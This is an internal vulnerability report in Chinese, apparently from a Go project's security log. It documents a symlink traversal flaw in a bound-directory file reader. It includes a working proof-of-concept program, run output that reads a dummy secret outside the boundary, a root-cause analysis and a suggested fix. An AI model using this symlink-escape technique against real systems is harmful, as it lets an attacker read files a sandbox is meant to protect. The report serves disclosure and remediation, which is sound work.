# T51-1 攻击载荷与击穿证据（GAP-77 / V-1）

发现时点：2026-11-03，P52 切片 S2 前置验证。执行环境：远程 Ubuntu VM `10.0.0.199`，工具链 `go1.22.12 linux/amd64`（与 CI `GO_VERSION=1.22.12` 对齐），仓库克隆 `~/LZProjects/prfrail` @ `941f60e`（本片 HEAD）。

## 结论

**ATTACK-SUCCEEDED**：`internal/adapters` 的绑定目录读取被中间组件符号链接击穿——`OpenBoundDirFile(dir, "link/secret", 1024)` 返回界外句柄并读出绑定目录之外的文件内容。防线未 fail-closed，属真实安全漏洞。本片不修生产代码，登记 GAP-77。

## 攻击载荷（逐字源码，探针 main 包）

```go
package main

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/larsonzh/prfrail/internal/adapters"
)

func main() {
	base, err := os.MkdirTemp("", "p52-t51")
	if err != nil {
		fmt.Println("SETUP-FAIL:", err)
		os.Exit(2)
	}
	defer os.RemoveAll(base)

	boundDir := filepath.Join(base, "D")
	outside := filepath.Join(base, "O")
	if err := os.MkdirAll(boundDir, 0o755); err != nil {
		fmt.Println("SETUP-FAIL:", err)
		os.Exit(2)
	}
	if err := os.MkdirAll(outside, 0o755); err != nil {
		fmt.Println("SETUP-FAIL:", err)
		os.Exit(2)
	}
	if err := os.WriteFile(filepath.Join(boundDir, "original"), []byte("inside"), 0o644); err != nil {
		fmt.Println("SETUP-FAIL:", err)
		os.Exit(2)
	}
	secret := []byte("SECRET-OUTSIDE-BOUNDARY")
	if err := os.WriteFile(filepath.Join(outside, "secret"), secret, 0o644); err != nil {
		fmt.Println("SETUP-FAIL:", err)
		os.Exit(2)
	}
	if err := os.Mkdir(filepath.Join(boundDir, "sub"), 0o755); err != nil {
		fmt.Println("SETUP-FAIL:", err)
		os.Exit(2)
	}
	if err := os.Symlink(outside, filepath.Join(boundDir, "link")); err != nil {
		fmt.Println("SETUP-FAIL:", err)
		os.Exit(2)
	}

	dir, err := adapters.OpenBoundDir(boundDir)
	if err != nil {
		fmt.Println("OPEN-BOUND-DIR-FAIL:", err)
		os.Exit(3)
	}
	defer dir.Close()

	bf, err := adapters.OpenBoundDirFile(dir, filepath.Join("link", "secret"), 1024)
	if err != nil {
		fmt.Println("ATTACK-BLOCKED:", err)
		os.Exit(0)
	}
	data, truncated, err := bf.ReadAll()
	if err != nil {
		fmt.Println("READ-FAIL:", err)
		os.Exit(4)
	}
	fmt.Printf("ATTACK-SUCCEEDED: read %d bytes truncated=%v content=%q\n", len(data), truncated, string(data))
	os.Exit(1)
}
```

## 运行输出原文（VM 实跑，逐字）

```
go version go1.22.12 linux/amd64
ATTACK-SUCCEEDED: read 23 bytes truncated=false content="SECRET-OUTSIDE-BOUNDARY"
exit status 1
PROBE-EXIT=1
```

## 根因定位（代码阅读，本片不修）

- `internal/adapters/bounddir_unix.go:64`：`syscall.Openat` 调用携带 `O_NOFOLLOW`（:66 为 `*os.PathError` 错误返回行），但 `O_NOFOLLOW` 仅保护**末组件**不跟随符号链接；`"link/secret"` 的中间组件 `link` 是符号链接，内核照常跟随，最终打开对象为 `O/secret`（绑定目录之外）。
- `cleanBoundRelativePath`（`bounddir_clean.go:20`）只做拼写级守卫（空名/绝对路径/`..`），不参与逐组件解析。
- `NewBoundFile`（`boundread.go:88`）只拒绝目录/非正则/超界，对句柄来源不做对象身份复核 ⇒ 界外字节完整进入 `ReadAll`/`Hash`。

## 未阻断后果

攻击者可把任意可读常规文件（含他人证据、宿主敏感文件）伪装为绑定目录内证据：`ReadAll` 与 `Hash` 均基于界外对象，绑定隔离承诺整体失效。

## 处置

按 P52 起跑消息 §六 第 2 条与用户三条铁律第 3 条：立即停止，本片不修生产代码；登记 GAP-77（HIGH，修复另开切片，候选方案=openat 逐级打开/O_PATH 逐组件解析）。
